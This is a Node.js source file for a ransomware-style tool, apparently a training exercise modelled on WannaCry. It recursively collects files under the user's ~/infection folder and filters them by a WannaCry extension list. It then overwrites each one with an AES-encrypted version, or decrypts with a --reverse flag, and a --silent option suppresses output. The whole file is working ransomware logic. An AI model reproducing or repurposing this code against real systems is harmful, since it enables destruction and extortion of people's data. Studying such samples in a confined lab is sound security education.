import yargs from "yargs";
import { readFile, access, constants } from "node:fs/promises";
import path from "node:path";
import fs from "fs";
import { wannaCryExtension } from "./wannaCryExtension.js";
import Chiffrement from "./crypto/Chiffrement.js";

const argv = yargs(process.argv.slice(2))
  .usage("--help | --version | --reverse <key> | --silent")
  .option("r", {
    alias: "reverse",
    describe: "Reverse the given key",
    type: "boolean",
  })
  .option("s", {
    alias: "silent",
    describe: "Silent mode",
    type: "boolean",
  })
  .help()
  .version()
  .alias("version", "v")
  .alias("help", "h").argv;
console.log(argv)


function getAllFiles(res, dir, datas) {
  res.forEach((file) => {
    if (file.isDirectory()) {
      let newdir = path.join(dir, file.name);
      let test = fs.readdirSync(newdir, { withFileTypes: true });
      getAllFiles(test, newdir, datas);
    } else {
      datas.push(dir + '/' + file.name);
    }
  });
}

function myScript() {
  try {
    const dir = path.join(process.env.HOME, "infection");
    let datas = [];
    //check access
    fs.access(dir, fs.constants.R_OK | fs.constants.W_OK, (err) => {
      if (err) {
        console.error(err);
        process.exit();
      }
    });

    //read dir
    let res = fs.readdirSync(dir, { withFileTypes: true });
    getAllFiles(res, dir, datas);

    //filter datas with targetExtension
    datas = datas.filter((e) => {
      let ext = e.split(".").pop();
      return wannaCryExtension.includes(ext);
    });
    console.log("datas filtred : ", datas)

    let chiffrement = new Chiffrement();
    if(argv.reverse) {
      datas.forEach((e) => {
        let content = fs.readFileSync(e);
        let contentDecrypted = chiffrement.aesDecryptWithIV(content.toString('utf8'));
        fs.writeFileSync(e, contentDecrypted);
        if(!argv.silent) console.log("file decrypted : ", e);
      });
    }
    else {
      //encrypt datas
      datas.forEach((e) => {
        let content = fs.readFileSync(e);
        let contentEncrypted = chiffrement.aesEncryptWithIV(content.toString('utf8'));
        fs.writeFileSync(e, contentEncrypted);
        if(!argv.silent) console.log("file encrypted : ", e);
      });
    }

  } catch (e) {
    console.error("error : ", e);
  }
}

myScript();
